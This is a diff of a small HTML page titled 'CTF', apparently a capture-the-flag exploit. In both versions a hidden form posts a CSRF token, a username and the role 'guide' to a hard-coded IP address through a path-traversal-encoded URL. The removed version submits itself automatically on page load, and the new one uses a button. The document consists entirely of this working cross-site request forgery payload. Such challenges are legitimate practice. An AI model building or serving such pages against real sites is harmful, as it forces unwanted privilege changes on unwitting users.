@@ -1,34 +1,13 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <title>CTF</title>
-</head>
+<html>
 <body>
 
-<form id="csrfForm"
-      action="http://34.141.16.244:30839//public/..%2Fawaken"
-      method="POST">
-
-    <input type="hidden"
-           name="_csrf"
-           value="281ec33f77598159da17b812d1585938.1784740871.7818184c73e8a7d5d48473991f9219e5f39ff700d29586c6a904b655829f6522">
-
-    <input type="hidden"
-           name="username"
-           value="error-kun">
-
-    <input type="hidden"
-           name="role"
-           value="guide">
-
+<form action="http://34.141.16.244:30839/public/..%2Fawaken" method="POST">
+    <input type="hidden" name="_csrf" value="325b3c6e416a2674b4ec07b6a34ee0a5.1784741988.88666ad2129edcd4096738559175cbd5eb4b26156f8c6d05863232c73b646b2f">
+    <input type="hidden" name="username" value="error-kun">
+    <input type="hidden" name="role" value="guide">
+    <button type="submit">Submit</button>
 </form>
-
-<script>
-window.onload = function () {
-    document.getElementById("csrfForm").submit();
-};
-</script>
 
 </body>
 </html>
